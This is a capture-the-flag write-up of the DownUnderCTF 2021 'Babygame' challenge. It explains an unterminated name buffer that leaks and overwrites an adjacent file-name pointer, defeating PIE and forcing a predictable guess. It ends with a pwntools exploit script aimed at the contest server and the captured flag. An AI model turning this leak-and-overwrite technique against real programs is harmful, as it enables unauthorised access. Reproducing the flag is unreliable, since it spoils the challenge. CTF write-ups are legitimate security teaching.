# Babygame

![](/2021/DownUnderCTF2021/Babygame/images/1.png)

Check the ELF

![](/2021/DownUnderCTF2021/Babygame/images/2.png)

Reverse with IDA

![](/2021/DownUnderCTF2021/Babygame/images/3.png)

The program first asks us to enter the NAME array, and then calls an infinite loop. Read input, `1` `2` `1337` and call `set_username()`, `print_username()`, `game()` corresponding.

Look `at game()` function

![](/2021/DownUnderCTF2021/Babygame/images/4.png)

The game function call fopen() with filename is the string RANDBUF point to. And read 4 byte. We need to enter correct 4 byte to get a shell.

We cannot bruteforce because RANDBUF is point to “/dev/urandom” string. So the program with open the /dev/urandom file, so that the value will is different each run.

Look at function `set_username()`

![](/2021/DownUnderCTF2021/Babygame/images/5.png)

Function call fread with the strlen(NAME)

Fucntion `print_username()`

![](/2021/DownUnderCTF2021/Babygame/images/6.png)

Just puts the Name

## So what is the bug?

![](/2021/DownUnderCTF2021/Babygame/images/7.png)

The NAME and RANDBUF variable are global variable, and it located on bss setion. NAME array is 32 characters and the pointer randbuf right after it. So look again to the code. The fread function at main will allow us to input maximum 32 character, and it NOT push the null byte in the end. So it make the randbuf pointer leakable. And after that, the print_username will give us the value of randbuf, which is a pointer to string ‘/dev/urandom’ in ELF file. And also the Edit username allow us to change that pointer (because strlen(NAME) will stop with null byte, so the size we fread can be 32 + size(RANDBUF) ).

![](/2021/DownUnderCTF2021/Babygame/images/8.png)

The bss if we enter full 32 charracter to NAME, it will concat the RANDBUF value with it. You can see the name vallue point to “/dev/urandom” string. After it, if you puts(NAME) the puts will put until read the NULL charracter (\x00), and the first NULL charracter is 2 highest byte in RANDBUF. So you can leak the value of RANDBUF and also change it because the strlen() will have same implementation with puts.

## Oke so what we have and what we can do?

  - We can leak the value of RANDBUF, with point to the string “/dev/urandom” in data section of ELF -> We can leak PIE base of program.

  - We can also overwrite it due the edit username function. To change it to point back to the address of NAME array, can do this because we have PIE leak before, we can make the game function open what file we want to open, not /dev/urandom.

  - Our target is to input exactly 4 byte when we call game() function, we cannot do that becasuse ‘/dev/urandom’ is random. We need to point it to another file that we can know or predict the first 4 byte, or some static file we can bruteforce.

I decide to point to the pwn file, which is the challenge’s ELF file running on server. I know it has the name “pwn” due to 3 chall I solved before.

![](/2021/DownUnderCTF2021/Babygame/images/9.png)

4 first byte of babygame is 7f 45 4c  46, so value we need input is 0x464c457f

## Finally exploit

  - First, we push 32 charracter to NAME when fread first call in main
  
  - Seccond, we use print_username to leak value of RANDBUF, calculate PIE base and address of NAME array

  - Third, we use edit_username to puts “pwn” + “\x00” * 29 + p64(NAME address) and overwrite the RANDBUF to NAME

  - Fourth, we call game and input 0x464c457f to get a shell

File [solve.py](/2021/DownUnderCTF2021/Babygame/solve.py)

```python
from pwn import *
s = remote('pwn-2021.duc.tf', 31907)
#s = process('./babygame')
#raw_input('DEBUG')
s.sendlineafter(b'name?\n', b'A' * 31)
s.sendlineafter(b'> ', b'2')
print(s.recvline())
dev_urandom_leak = int.from_bytes(s.recvline().strip(), byteorder = 'little', signed = False)
name = dev_urandom_leak - 0x2024 + 0x40A0
print(hex(dev_urandom_leak))
print(hex(name))
s.sendlineafter(b'> ', b'1')
print(p64(name)[:-2])
s.sendafter(b'to?\n', b'pwn' + p32(0) + b'A' * 25 + p64(name)[:-2])
#s.sendafter(b'to?\n', b'babygame' + p32(0) + b'A' * 20 + p64(dev_stdin)[:-2])
s.sendlineafter(b'> ', b'1337')
s.sendlineafter(b'guess: ', b'1179403647')
s.interactive()
```

![](/2021/DownUnderCTF2021/Babygame/images/10.png)

`flag: DUCTF{whats_in_a_name?_5aacfc58}`

